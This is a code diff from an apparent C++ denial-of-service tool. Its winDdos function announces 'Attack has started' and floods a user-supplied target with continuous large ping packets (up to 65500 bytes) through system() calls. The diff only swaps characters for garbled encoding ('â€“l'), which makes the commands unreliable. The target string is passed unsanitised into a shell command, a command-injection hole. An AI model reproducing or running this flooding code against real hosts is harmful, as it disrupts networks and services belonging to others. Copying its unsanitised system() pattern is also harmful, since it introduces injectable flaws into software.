@@ -40,7 +40,7 @@ int dspl(int L,string T,string con,int OXS){
 
     //Banner
     std::cout << R"(
-                      ??Ø?
+                      NÃŠÃ˜N
                                      -v:01.00
     )" << '\n';
 
@@ -218,7 +218,7 @@ void winDdos(int ld,string targ,
             usleep(1 * msec);
             cout<< "[+] "<<z; xn
             cout<< "[# Attack has started] !";
-            system(("ping -t –l 15000 " + targ).c_str());
+            system(("ping -t â€“l 15000 " + targ).c_str());
 
         }
     }
@@ -232,7 +232,7 @@ void winDdos(int ld,string targ,
             usleep(1 * msec);
             cout<< "[+] "<<z; xn
             cout<< "[# Attack has started] !";
-            system(("ping -t –l 30000 " + targ).c_str());
+            system(("ping -t â€“l 30000 " + targ).c_str());
 
         }
     }
@@ -246,7 +246,7 @@ void winDdos(int ld,string targ,
             usleep(1 * msec);
             cout<< "[+] "<<z; xn
             cout<< "[# Attack has started] !";
-            system(("ping -t –l 65500 " + targ).c_str());
+            system(("ping -t â€“l 65500 " + targ).c_str());
 
         }
     }
